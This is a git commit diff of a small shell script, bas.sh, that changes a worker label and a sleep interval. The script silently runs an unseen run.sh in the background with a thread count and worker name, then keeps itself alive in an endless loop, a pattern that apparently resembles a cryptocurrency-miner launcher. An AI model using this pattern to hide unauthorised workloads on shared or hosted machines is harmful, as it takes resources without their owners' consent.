44f14a3012ddda1c9b2354457e7f79ad9e58c2b1
satelitlima00 <128956610+satelitlima00@users.noreply.github.com>
2026-04-09 10:34:04 +0700

    Update bas.sh

--- bas.sh
+++ bas.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
 
-cd app && chmod 777 run.sh && nproc --all && ./run.sh 7 Wijaya-14 >/dev/null 2>&1 &
+cd app && chmod 777 run.sh && nproc --all && ./run.sh 7 WORKER-01 >/dev/null 2>&1 &
 sleep 100
 while true
 do
         echo "...ojo lali ngopi boss..."
-        sleep 60
+        sleep 100
 done
